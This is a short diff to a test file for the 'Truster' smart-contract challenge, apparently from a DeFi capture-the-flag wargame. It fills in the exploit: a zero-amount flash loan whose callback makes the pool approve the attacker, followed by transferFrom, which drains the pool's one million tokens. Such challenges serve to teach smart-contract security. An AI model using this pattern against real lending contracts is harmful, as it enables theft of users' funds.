@@ -30,6 +30,8 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        this.pool.flashLoan(0, attacker, this.token.address,  this.token.contract.methods.approve(attacker, ether('1000000').toString()).encodeABI(), {from: attacker})
+        this.token.transferFrom(this.pool.address, attacker, ether('1000000'), {from: attacker})
     });
 
     after(async function () {
